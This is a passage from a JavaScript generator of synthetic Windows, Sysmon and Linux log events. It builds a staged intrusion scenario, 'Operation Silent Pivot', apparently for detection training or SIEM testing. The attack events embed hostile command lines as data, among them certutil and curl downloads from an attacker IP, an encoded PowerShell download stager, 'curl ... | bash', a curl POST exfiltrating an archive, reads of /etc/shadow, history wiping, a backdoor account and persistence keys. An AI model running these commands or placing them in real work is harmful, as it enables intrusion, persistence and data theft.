    { name: "certutil.exe", path: "C:\\Windows\\System32\\certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://91.234.56.78:8080/update.exe C:\\Users\\Public\\update.exe", parent: "cmd.exe" },
    { name: "schtasks.exe", path: "C:\\Windows\\System32\\schtasks.exe", cmdline: 'schtasks.exe /Create /SC DAILY /TN "WindowsUpdate" /TR "C:\\Users\\Public\\update.exe" /ST 02:00 /RU SYSTEM', parent: "cmd.exe" },
    { name: "powershell.exe", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwA5ADEALgAyADMANAAuADUANgAuADcAOAA6ADgAMAA4ADAALwBzAHQAYQBnAGUAcgAnACkA", parent: "cmd.exe" },
    { name: "mshta.exe", path: "C:\\Windows\\System32\\mshta.exe", cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass\"\", 0 : close\")", parent: "explorer.exe" },
  ];

  const proc = isAttack ? (opts.process || pick(attackProcesses)) : pick(normalProcesses);

  const doc = winBase(4688, ts);
  doc.event.kind = "event";
  doc.event.category = ["process"];
  doc.event.type = ["start"];
  doc.event.action = "process-created";
  doc.event.outcome = "success";
  doc.event.code = "4688";
  doc.message = `A new process has been created. Process: ${proc.path} CommandLine: ${proc.cmdline}`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows", platform: "windows" } };
  doc.process = {
    name: proc.name,
    executable: proc.path,
    command_line: proc.cmdline,
    pid: randomInt(1000, 50000),
    parent: { name: proc.parent, pid: randomInt(500, 5000) }
  };
  doc.winlog.event_data = {
    NewProcessName: proc.path, CommandLine: proc.cmdline,
    ParentProcessName: `C:\\Windows\\System32\\${proc.parent}`,
    SubjectUserName: user, SubjectDomainName: "CORP",
    TokenElevationType: "%%1937", MandatoryLabel: "S-1-16-8192"
  };
  return doc;
}

// 4698 — Scheduled task created
function generateWin4698(opts = {}) {
  const ts = opts.ts || bgTimestamp();
  const user = opts.user || ATTACKER.compromisedUser;
  const hostname = opts.hostname || pick(HOSTNAMES);

  const doc = winBase(4698, ts);
  doc.event.kind = "event";
  doc.event.category = ["iam"];
  doc.event.type = ["creation"];
  doc.event.action = "scheduled-task-created";
  doc.event.outcome = "success";
  doc.event.code = "4698";
  doc.message = `A scheduled task was created. Task: \\WindowsUpdate`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.winlog.event_data = {
    SubjectUserName: user, SubjectDomainName: "CORP",
    TaskName: "\\WindowsUpdate",
    TaskContent: `<Exec><Command>C:\\Users\\Public\\update.exe</Command></Exec><Triggers><CalendarTrigger><StartBoundary>2026-03-25T02:00:00</StartBoundary><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers>`
  };
  return doc;
}

// 4720 — User account created
function generateWin4720(opts = {}) {
  const ts = opts.ts || bgTimestamp();
  const creator = opts.creator || ATTACKER.compromisedUser;
  const newUser = opts.newUser || "svc_helpdeskX";
  const hostname = opts.hostname || "SRV-DC01";

  const doc = winBase(4720, ts);
  doc.event.kind = "event";
  doc.event.category = ["iam"];
  doc.event.type = ["user", "creation"];
  doc.event.action = "user-account-created";
  doc.event.outcome = "success";
  doc.event.code = "4720";
  doc.message = `A user account was created. New Account: ${newUser} by ${creator}`;
  doc.user = { name: creator, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.winlog.event_data = {
    SubjectUserName: creator, SubjectDomainName: "CORP",
    TargetUserName: newUser, TargetDomainName: "CORP",
    UserPrincipalName: `${newUser}@corp.local`,
    SamAccountName: newUser
  };
  return doc;
}

// 4776 — NTLM credential validation
function generateWin4776(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);
  const outcome = isAttack ? (opts.outcome || "success") : weightedPick(["success", "failure"], [95, 5]);

  const doc = winBase(4776, ts);
  doc.event.kind = "event";
  doc.event.category = ["authentication"];
  doc.event.type = outcome === "success" ? ["start"] : ["start", "denied"];
  doc.event.action = "credential-validation";
  doc.event.outcome = outcome;
  doc.event.code = "4776";
  doc.message = `The computer attempted to validate the credentials for an account. Logon Account: ${user}`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: "SRV-DC01", os: { family: "windows" } };
  doc.winlog.event_data = {
    TargetUserName: user, Workstation: pick(HOSTNAMES),
    PackageName: "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
    Status: outcome === "success" ? "0x0" : "0xC000006A"
  };
  return doc;
}

// ═══════════════════════════════════════════════════════════════
//  PART 3: WINDOWS SYSMON LOG GENERATORS
// ═══════════════════════════════════════════════════════════════

function sysmonBase(eventId, ts) {
  return {
    "@timestamp": ts || bgTimestamp(),
    data_stream: { type: "logs", dataset: "windows.sysmon_operational", namespace: "default" },
    tags: [CONFIG.tag],
    event: { module: "windows", dataset: "windows.sysmon_operational", provider: "Microsoft-Windows-Sysmon" },
    agent: { type: "winlogbeat", version: "8.17.0" },
    ecs: { version: CONFIG.ecsVersion },
    winlog: { api: "wineventlog", channel: "Microsoft-Windows-Sysmon/Operational", event_id: String(eventId), provider_name: "Microsoft-Windows-Sysmon" }
  };
}

// Sysmon Event 1 — Process Create (richer than 4688)
function generateSysmon1(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);
  const processGuid = `{${uuid()}}`;
  const parentGuid = `{${uuid()}}`;

  const normalProcs = [
    { img: "C:\\Windows\\System32\\svchost.exe", cmdline: "svchost.exe -k netsvcs", parentImg: "C:\\Windows\\System32\\services.exe", hash: "SHA256=ABC123..." },
    { img: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", cmdline: "chrome.exe --type=renderer", parentImg: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", hash: "SHA256=DEF456..." },
  ];

  const attackProcs = [
    { img: "C:\\Windows\\System32\\certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://91.234.56.78:8080/update.exe C:\\Users\\Public\\update.exe", parentImg: "C:\\Windows\\System32\\cmd.exe", hash: "SHA256=8A7F2B..." },
    { img: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...", parentImg: "C:\\Windows\\System32\\cmd.exe", hash: "SHA256=9C3E4A..." },
    { img: "C:\\Windows\\System32\\mshta.exe", cmdline: "mshta.exe vbscript:Execute(...)", parentImg: "C:\\Windows\\explorer.exe", hash: "SHA256=B1D5E7..." },
    { img: "C:\\Users\\Public\\update.exe", cmdline: "C:\\Users\\Public\\update.exe --beacon", parentImg: "C:\\Windows\\System32\\schtasks.exe", hash: "SHA256=MALWARE1234..." },
  ];

  const proc = isAttack ? (opts.process || pick(attackProcs)) : pick(normalProcs);

  const doc = sysmonBase(1, ts);
  doc.event.kind = "event";
  doc.event.category = ["process"];
  doc.event.type = ["start"];
  doc.event.action = "Process Create";
  doc.message = `Process Create: ${proc.img} ${proc.cmdline}`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.process = {
    executable: proc.img, name: path.basename(proc.img),
    command_line: proc.cmdline, pid: randomInt(1000, 50000),
    entity_id: processGuid, hash: { sha256: proc.hash.replace("SHA256=", "") },
    parent: { executable: proc.parentImg, name: path.basename(proc.parentImg), pid: randomInt(500, 5000), entity_id: parentGuid }
  };
  doc.winlog.event_data = {
    Image: proc.img, CommandLine: proc.cmdline,
    ParentImage: proc.parentImg, Hashes: proc.hash,
    ProcessGuid: processGuid, ParentProcessGuid: parentGuid,
    User: `CORP\\${user}`, IntegrityLevel: "High",
    OriginalFileName: path.basename(proc.img)
  };
  return doc;
}

// Sysmon Event 3 — Network Connection
function generateSysmon3(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);

  const srcIP = isAttack ? ATTACKER.vpnAssignedIP : randomInternalIP();
  const dstIP = isAttack ? (opts.dstIP || ATTACKER.c2Server.ip) : pick(EXTERNAL_HOSTS).ip;
  const dstPort = isAttack ? (opts.dstPort || 8080) : pick([80, 443, 8080]);
  const procImg = isAttack ? (opts.procImage || "C:\\Users\\Public\\update.exe") : pick(["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\System32\\svchost.exe"]);

  const doc = sysmonBase(3, ts);
  doc.event.kind = "event";
  doc.event.category = ["network"];
  doc.event.type = ["connection", "start"];
  doc.event.action = "Network connection detected";
  doc.message = `Network connection: ${procImg} -> ${dstIP}:${dstPort}`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.source = { ip: srcIP, port: randomInt(1024, 65535) };
  doc.destination = { ip: dstIP, port: dstPort };
  doc.network = { transport: "tcp", direction: "outbound" };
  doc.process = { executable: procImg, name: path.basename(procImg), pid: randomInt(1000, 50000) };
  doc.winlog.event_data = {
    Image: procImg, SourceIp: srcIP, DestinationIp: dstIP,
    DestinationPort: String(dstPort), Protocol: "tcp",
    User: `CORP\\${user}`, Initiated: "true"
  };
  return doc;
}

// Sysmon Event 11 — File Create
function generateSysmon11(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);

  const normalFiles = [
    { target: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\~DF12345.tmp", proc: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" },
    { target: "C:\\Windows\\Temp\\cab_1234", proc: "C:\\Windows\\System32\\svchost.exe" },
  ];
  const attackFiles = [
    { target: "C:\\Users\\Public\\update.exe", proc: "C:\\Windows\\System32\\certutil.exe" },
    { target: "C:\\Users\\Public\\data_archive.7z", proc: "C:\\Windows\\System32\\cmd.exe" },
    { target: "C:\\Users\\rjohnson\\AppData\\Local\\Temp\\mimikatz.exe", proc: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" },
  ];

  const file = isAttack ? (opts.file || pick(attackFiles)) : pick(normalFiles);

  const doc = sysmonBase(11, ts);
  doc.event.kind = "event";
  doc.event.category = ["file"];
  doc.event.type = ["creation"];
  doc.event.action = "File created";
  doc.message = `File created: ${file.target}`;
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.file = { path: file.target, name: path.basename(file.target), extension: path.extname(file.target).slice(1) };
  doc.process = { executable: file.proc, name: path.basename(file.proc) };
  doc.winlog.event_data = { TargetFilename: file.target, Image: file.proc, CreationUtcTime: ts };
  return doc;
}

// Sysmon Event 13 — Registry Value Set
function generateSysmon13(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);

  const normalEntries = [
    { target: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth", details: "C:\\Windows\\System32\\SecurityHealthSystray.exe" },
  ];
  const attackEntries = [
    { target: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate", details: "C:\\Users\\Public\\update.exe --silent" },
    { target: "HKCU\\Environment\\UserInitMprLogonScript", details: "C:\\Users\\Public\\update.exe" },
  ];

  const entry = isAttack ? pick(attackEntries) : pick(normalEntries);

  const doc = sysmonBase(13, ts);
  doc.event.kind = "event";
  doc.event.category = ["registry"];
  doc.event.type = ["change"];
  doc.event.action = "Registry value set";
  doc.message = `Registry value set: ${entry.target}`;
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.registry = { path: entry.target, data: { strings: [entry.details] } };
  doc.winlog.event_data = { TargetObject: entry.target, Details: entry.details, EventType: "SetValue" };
  return doc;
}

// Sysmon Event 22 — DNS Query
function generateSysmon22(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);

  const normalDomains = ["www.google.com", "outlook.office365.com", "login.microsoftonline.com", "github.com", "cdn.elastic.co"];
  const attackDomains = ["c2-server.xyz", "beacon.91-234-56-78.nip.io", "dns-tunnel-abcdef.evil-dns.ru", "cdn-storage.example.cn"];

  const domain = isAttack ? pick(attackDomains) : pick(normalDomains);

  const doc = sysmonBase(22, ts);
  doc.event.kind = "event";
  doc.event.category = ["network"];
  doc.event.type = ["connection", "protocol"];
  doc.event.action = "DNSEvent (DNS query)";
  doc.message = `DNS query: ${domain}`;
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.dns = { question: { name: domain, type: "A" }, response_code: "NOERROR" };
  doc.process = { executable: isAttack ? "C:\\Users\\Public\\update.exe" : "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" };
  doc.winlog.event_data = { QueryName: domain, QueryStatus: "0", QueryResults: isAttack ? ATTACKER.c2Server.ip : pick(EXTERNAL_HOSTS).ip };
  return doc;
}


// ═══════════════════════════════════════════════════════════════
//  PART 4: LINUX AUTH / AUDIT LOG GENERATORS
// ═══════════════════════════════════════════════════════════════

function linuxBase(ts) {
  return {
    "@timestamp": ts || bgTimestamp(),
    data_stream: { type: "logs", dataset: "system.auth", namespace: "default" },
    tags: [CONFIG.tag],
    event: { module: "system", dataset: "system.auth" },
    agent: { type: "filebeat", version: "8.17.0" },
    ecs: { version: CONFIG.ecsVersion },
    host: { name: NET.LINUX_HOSTNAME, ip: [NET.LINUX_SERVER_IP], os: { family: "linux", platform: "linux", name: "Rocky Linux", version: "9.6" } }
  };
}

// SSH successful login
function generateLinuxSSH(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(["jsmith", "mwilson", "alee", "tchen", "root"]);
  const srcIP = isAttack ? (opts.srcIP || ATTACKER.vpnAssignedIP) : randomInternalIP();
  const outcome = isAttack ? (opts.outcome || "success") : weightedPick(["success", "failure"], [85, 15]);

  const doc = linuxBase(ts);
  doc.event.kind = "event";
  doc.event.category = ["authentication"];
  doc.event.type = outcome === "success" ? ["start", "allowed"] : ["start", "denied"];
  doc.event.action = outcome === "success" ? "ssh_login" : "ssh_login";
  doc.event.outcome = outcome;
  doc.message = outcome === "success"
    ? `Accepted publickey for ${user} from ${srcIP} port ${randomInt(1024, 65535)} ssh2`
    : `Failed password for ${user} from ${srcIP} port ${randomInt(1024, 65535)} ssh2`;
  doc.user = { name: user };
  doc.source = { ip: srcIP, port: randomInt(1024, 65535) };
  doc.process = { name: "sshd", pid: randomInt(1000, 30000) };
  doc.system = { auth: { ssh: { method: outcome === "success" ? "publickey" : "password", event: outcome === "success" ? "Accepted" : "Failed" } } };
  return doc;
}

// sudo execution
function generateLinuxSudo(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? ATTACKER.compromisedUser : pick(["jsmith", "mwilson", "alee"]);

  const normalCmds = ["/usr/bin/systemctl restart nginx", "/usr/bin/yum update -y", "/usr/bin/tail -f /var/log/messages", "/usr/bin/journalctl -xe"];
  const attackCmds = [
    "/usr/bin/cat /etc/shadow",
    "/usr/bin/useradd -m -G wheel svc_support",
    "/usr/bin/crontab -e",
    "/usr/bin/tar czf /tmp/.data_archive.tar.gz /home/ /var/lib/mysql/",
    "/usr/bin/curl -X POST https://218.92.0.190:8443/upload -d @/tmp/.data_archive.tar.gz",
    "/usr/bin/chmod +s /usr/bin/find",
    "/usr/sbin/iptables -A INPUT -s 91.234.56.78 -j ACCEPT",
  ];

  const cmd = isAttack ? (opts.cmd || pick(attackCmds)) : pick(normalCmds);

  const doc = linuxBase(ts);
  doc.data_stream.dataset = "system.auth";
  doc.event.kind = "event";
  doc.event.category = ["process"];
  doc.event.type = ["start"];
  doc.event.action = "sudo";
  doc.event.outcome = "success";
  doc.message = `${user} : TTY=pts/0 ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;
  doc.user = { name: user, effective: { name: "root" } };
  doc.process = { name: "sudo", pid: randomInt(5000, 40000), command_line: cmd };
  return doc;
}

// cron execution
function generateLinuxCron(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? "root" : pick(["root", "nobody", "www-data"]);
  const normalJobs = ["/usr/sbin/logrotate /etc/logrotate.conf", "/usr/bin/certbot renew --quiet", "/opt/scripts/backup.sh"];
  const attackJobs = ["/tmp/.hidden/beacon.sh", "curl http://91.234.56.78:8080/heartbeat | bash"];
  const cmd = isAttack ? pick(attackJobs) : pick(normalJobs);

  const doc = linuxBase(ts);
  doc.data_stream.dataset = "system.auth";
  doc.event.kind = "event";
  doc.event.category = ["process"];
  doc.event.type = ["start"];
  doc.event.action = "cron_start";
  doc.event.outcome = "success";
  doc.message = `CRON[${randomInt(10000, 50000)}]: (${user}) CMD (${cmd})`;
  doc.user = { name: user };
  doc.process = { name: "cron", pid: randomInt(10000, 50000), command_line: cmd };
  return doc;
}

// auditd process execution (for command history)
function generateLinuxAuditExec(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? ATTACKER.compromisedUser : pick(["jsmith", "mwilson", "alee"]);

  const normalCmds = ["ls -la", "cd /var/log", "grep error syslog", "df -h", "top -bn1", "systemctl status nginx"];
  const attackCmds = [
    "whoami", "id", "uname -a", "cat /etc/passwd",
    "find / -perm -4000 2>/dev/null",
    "ss -tlnp",
    "curl -s http://91.234.56.78:8080/stager.sh -o /tmp/.stager.sh",
    "chmod +x /tmp/.stager.sh",
    "bash /tmp/.stager.sh",
    "history -c",
    "rm -rf /tmp/.stager.sh",
    "dd if=/var/lib/mysql/customer_data.ibd of=/tmp/.data_dump bs=4M",
  ];

  const cmd = isAttack ? (opts.cmd || pick(attackCmds)) : pick(normalCmds);
  const exe = cmd.split(" ")[0];

  const doc = linuxBase(ts);
  doc.data_stream.dataset = "system.auth";
  doc.event.kind = "event";
  doc.event.category = ["process"];
  doc.event.type = ["start"];
  doc.event.action = "executed";
  doc.event.outcome = "success";
  doc.message = `EXECVE: ${cmd}`;
  doc.user = { name: user, audit: { id: String(randomInt(1000, 9999)) } };
  doc.process = {
    name: path.basename(exe), executable: `/usr/bin/${path.basename(exe)}`,
    command_line: cmd, pid: randomInt(5000, 50000),
    parent: { name: "bash", pid: randomInt(1000, 5000) }
  };
  return doc;
}


// ═══════════════════════════════════════════════════════════════
//  PART 5: ATTACK STORY — "OPERATION SILENT PIVOT"
// ═══════════════════════════════════════════════════════════════

function generateAttackStory() {
  const events = [];

  // ── Stage 1: VPN Brute-Force (T+0 to ~T+5min) ─────────────
  // 35 failed auth attempts in a rapid 3-minute burst (credential spray)
  for (let i = 0; i < 35; i++) {
    const ts = attackTs(0 + (i / 35) * 0.05, 0.2); // 0.05h = 3 min, ±12s jitter
    events.push(generatePAAuth({ attack: true, ts, outcome: "failure" }));
  }
  // Successful auth at ~T+5min (attacker found valid creds, logs in)
  const successAuthTs = attackTs(0.083, 0.3); // 0.083h ≈ 5 min, ±18s jitter
  events.push(generatePAAuth({ attack: true, ts: successAuthTs, outcome: "success" }));

  // GlobalProtect VPN connected at ~T+6min
  const vpnConnectTs = attackTs(0.1, 0.3); // 0.1h = 6 min
  events.push(generatePAGlobalProtect({ attack: true, ts: vpnConnectTs, status: "connected" }));

  // User-ID mapping at ~T+7min
  events.push(generatePAUserID({ attack: true, ts: attackTs(0.117, 0.2) }));

  // PA Traffic: VPN-assigned IP starts appearing in internal traffic (~T+10min onward)
  for (let i = 0; i < 10; i++) {
    const ts = attackTs(0.17 + i * 0.1, 1); // starts ~T+10min, each ~6min apart
    const doc = generatePATraffic();
    doc["@timestamp"] = ts;
    doc.source.ip = ATTACKER.vpnAssignedIP;
    doc.panw.panos.source.zone = PA_ZONES.vpn;
    doc.user = { name: ATTACKER.compromisedUser };
    doc.tags = [CONFIG.tag];
    events.push(doc);
  }

  // ── Stage 2: Internal Recon (T+2h to T+4h) ───────────────
  // Windows 4624 — attacker logs into workstations
  const reconHosts = ["WS-PC003", "SRV-FILE01", "SRV-DC01"];
  for (const host of reconHosts) {
    const ts = attackTs(2 + Math.random() * 1.5, 10);
    events.push(generateWin4624({ attack: true, ts, hostname: host, logonType: 3, srcIP: ATTACKER.vpnAssignedIP }));
  }

  // 4688 — Discovery commands
  const reconCommands = [
    { name: "whoami.exe", path: "C:\\Windows\\System32\\whoami.exe", cmdline: "whoami.exe /all", parent: "cmd.exe" },
    { name: "net.exe", path: "C:\\Windows\\System32\\net.exe", cmdline: "net.exe user /domain", parent: "cmd.exe" },
    { name: "net.exe", path: "C:\\Windows\\System32\\net.exe", cmdline: 'net.exe group "Domain Admins" /domain', parent: "cmd.exe" },
    { name: "nltest.exe", path: "C:\\Windows\\System32\\nltest.exe", cmdline: "nltest.exe /dclist:CORP", parent: "cmd.exe" },
    { name: "net.exe", path: "C:\\Windows\\System32\\net.exe", cmdline: "net.exe share", parent: "cmd.exe" },
    { name: "ipconfig.exe", path: "C:\\Windows\\System32\\ipconfig.exe", cmdline: "ipconfig.exe /all", parent: "cmd.exe" },
    { name: "systeminfo.exe", path: "C:\\Windows\\System32\\systeminfo.exe", cmdline: "systeminfo.exe", parent: "cmd.exe" },
  ];
  for (let i = 0; i < reconCommands.length; i++) {
    const ts = attackTs(2.5 + i * 0.005, 0.3); // ~18s apart, ±18s jitter — rapid-fire recon burst over ~2min
    events.push(generateWin4688({ attack: true, ts, hostname: "WS-PC003", process: reconCommands[i] }));
    events.push(generateSysmon1({ attack: true, ts, hostname: "WS-PC003", process: {
      img: reconCommands[i].path, cmdline: reconCommands[i].cmdline,
      parentImg: "C:\\Windows\\System32\\cmd.exe", hash: "SHA256=RECON..."
    }}));
  }

  // DNS queries for internal resources
  for (let i = 0; i < 5; i++) {
    events.push(generateSysmon22({ attack: false, ts: attackTs(2.5 + i * 0.2, 5), hostname: "WS-PC003" }));
  }

  // 4776 — NTLM credential validation attempts against DC
  for (let i = 0; i < 8; i++) {
    events.push(generateWin4776({ attack: true, ts: attackTs(3 + i * 0.1, 5), outcome: i < 6 ? "failure" : "success", user: pick(["admin.ops", "svc_backup", "administrator"]) }));
  }

  // ── Stage 3: Lateral Movement (T+6h to T+8h) ─────────────
  // 4648 — explicit credential logon (runas with stolen creds)
  events.push(generateWin4648({ ts: attackTs(6, 10), srcUser: ATTACKER.compromisedUser, targetUser: ATTACKER.targetUser, hostname: "SRV-DC01" }));

  // 4624 — attacker logs into DC with admin.ops creds
  events.push(generateWin4624({ attack: true, ts: attackTs(6.2, 5), user: ATTACKER.targetUser, hostname: "SRV-DC01", srcIP: ATTACKER.vpnAssignedIP, logonType: 3 }));
  events.push(generateWin4672({ ts: attackTs(6.25, 3), user: ATTACKER.targetUser, hostname: "SRV-DC01" }));

  // SSH to Linux server (lateral movement)
  events.push(generateLinuxSSH({ attack: true, ts: attackTs(7, 10), srcIP: ATTACKER.vpnAssignedIP }));

  // 4624 type 3 on a file server
  events.push(generateWin4624({ attack: true, ts: attackTs(7.5, 10), user: ATTACKER.targetUser, hostname: "SRV-FILE01", srcIP: ATTACKER.vpnAssignedIP, logonType: 3 }));

  // Linux recon commands after SSH
  const linuxRecon = ["whoami", "id", "uname -a", "cat /etc/passwd", "ss -tlnp", "find / -perm -4000 2>/dev/null"];
  for (let i = 0; i < linuxRecon.length; i++) {
    events.push(generateLinuxAuditExec({ attack: true, ts: attackTs(7.2 + i * 0.1, 5), cmd: linuxRecon[i] }));
  }

  // ── Stage 4: Persistence & Defense Evasion (T+10h to T+14h) ──
  // 4720 — backdoor account created
  events.push(generateWin4720({ ts: attackTs(10, 10), creator: ATTACKER.targetUser, newUser: "svc_helpdeskX", hostname: "SRV-DC01" }));

  // certutil download of payload
  const certutilTs = attackTs(11, 10);
  events.push(generateWin4688({ attack: true, ts: certutilTs, hostname: "WS-PC003", user: ATTACKER.compromisedUser,
    process: { name: "certutil.exe", path: "C:\\Windows\\System32\\certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://91.234.56.78:8080/update.exe C:\\Users\\Public\\update.exe", parent: "cmd.exe" }
  }));
  events.push(generateSysmon1({ attack: true, ts: certutilTs, hostname: "WS-PC003",
    process: { img: "C:\\Windows\\System32\\certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://91.234.56.78:8080/update.exe C:\\Users\\Public\\update.exe", parentImg: "C:\\Windows\\System32\\cmd.exe", hash: "SHA256=8A7F2B..." }
  }));
  events.push(generateSysmon11({ attack: true, ts: attackTs(11.05, 3), hostname: "WS-PC003",
    file: { target: "C:\\Users\\Public\\update.exe", proc: "C:\\Windows\\System32\\certutil.exe" }
  }));
  // Sysmon 3 — certutil connecting to C2
  events.push(generateSysmon3({ attack: true, ts: certutilTs, hostname: "WS-PC003", dstIP: ATTACKER.c2Server.ip, dstPort: 8080, procImage: "C:\\Windows\\System32\\certutil.exe" }));

  // PA Threat: C2 download detected
  const c2ThreatDoc = generatePAThreat();
  c2ThreatDoc["@timestamp"] = certutilTs;
  c2ThreatDoc.source.ip = ATTACKER.vpnAssignedIP;
  c2ThreatDoc.destination.ip = ATTACKER.c2Server.ip;
  c2ThreatDoc.destination.geo = { country_name: ATTACKER.c2Server.country, country_iso_code: ATTACKER.c2Server.cc, city_name: ATTACKER.c2Server.city, location: { lat: ATTACKER.c2Server.lat, lon: ATTACKER.c2Server.lon } };
  c2ThreatDoc.panw.panos.threat.name = "Known Malware Command and Control";
  c2ThreatDoc.panw.panos.severity = "critical";
  c2ThreatDoc.user = { name: ATTACKER.compromisedUser };
  c2ThreatDoc.tags = [CONFIG.tag];
  events.push(c2ThreatDoc);

  // Scheduled task for persistence
  events.push(generateWin4698({ ts: attackTs(12, 10), user: ATTACKER.compromisedUser, hostname: "WS-PC003" }));

  // Registry persistence
  events.push(generateSysmon13({ attack: true, ts: attackTs(12.1, 5), hostname: "WS-PC003" }));

  // Encoded PowerShell execution
  events.push(generateWin4688({ attack: true, ts: attackTs(12.5, 5), hostname: "WS-PC003", user: ATTACKER.compromisedUser,
    process: { name: "powershell.exe", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwA5ADEALgAyADMANAAuADUANgAuADcAOAA6ADgAMAA4ADAALwBzAHQAYQBnAGUAcgAnACkA", parent: "mshta.exe" }
  }));
  events.push(generateSysmon1({ attack: true, ts: attackTs(12.5, 5), hostname: "WS-PC003",
    process: { img: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmdline: "powershell.exe -enc SQBFAFgA...", parentImg: "C:\\Windows\\System32\\mshta.exe", hash: "SHA256=PS_ENC..." }
  }));

  // Linux persistence: cron job + SUID
  events.push(generateLinuxSudo({ attack: true, ts: attackTs(13, 10), cmd: "/usr/bin/crontab -e" }));
  events.push(generateLinuxCron({ attack: true, ts: attackTs(13.5, 10) }));
  events.push(generateLinuxSudo({ attack: true, ts: attackTs(13.7, 5), cmd: "/usr/bin/chmod +s /usr/bin/find" }));

  // ── Stage 5: C2 Beaconing (T+14h to T+48h) ───────────────
  // Regular C2 callbacks every ~30 min
  for (let h = 14; h < 48; h += 0.5) {
    const ts = attackTs(h, 10);
    events.push(generateSysmon3({ attack: true, ts, hostname: "WS-PC003", dstIP: ATTACKER.c2Server.ip, dstPort: 443, procImage: "C:\\Users\\Public\\update.exe" }));
    events.push(generateSysmon22({ attack: true, ts, hostname: "WS-PC003" }));
    // PA traffic for the beacon
    if (Math.random() < 0.3) {
      const paTraf = generatePATraffic();
      paTraf["@timestamp"] = ts;
      paTraf.source.ip = ATTACKER.vpnAssignedIP;
      paTraf.destination.ip = ATTACKER.c2Server.ip;
      paTraf.destination.port = 443;
      paTraf.destination.geo = { country_name: ATTACKER.c2Server.country, country_iso_code: ATTACKER.c2Server.cc, city_name: ATTACKER.c2Server.city, location: { lat: ATTACKER.c2Server.lat, lon: ATTACKER.c2Server.lon } };
      paTraf.network.application = "ssl";
      paTraf.panw.panos.action = "allow";
      paTraf.event.action = "allow";
      paTraf.user = { name: ATTACKER.compromisedUser };
      paTraf.tags = [CONFIG.tag];
      events.push(paTraf);
    }
  }

  // ── Stage 6: Data Staging & Exfiltration (T+50h to T+65h) ──
  // Linux: tar up sensitive data
  events.push(generateLinuxSudo({ attack: true, ts: attackTs(50, 10), cmd: "/usr/bin/tar czf /tmp/.data_archive.tar.gz /home/ /var/lib/mysql/" }));
  events.push(generateLinuxAuditExec({ attack: true, ts: attackTs(50.5, 5), cmd: "dd if=/var/lib/mysql/customer_data.ibd of=/tmp/.data_dump bs=4M" }));

  // Windows: data archive
  events.push(generateSysmon11({ attack: true, ts: attackTs(51, 10), hostname: "SRV-FILE01",
    file: { target: "C:\\Users\\Public\\data_archive.7z", proc: "C:\\Windows\\System32\\cmd.exe" }
  }));

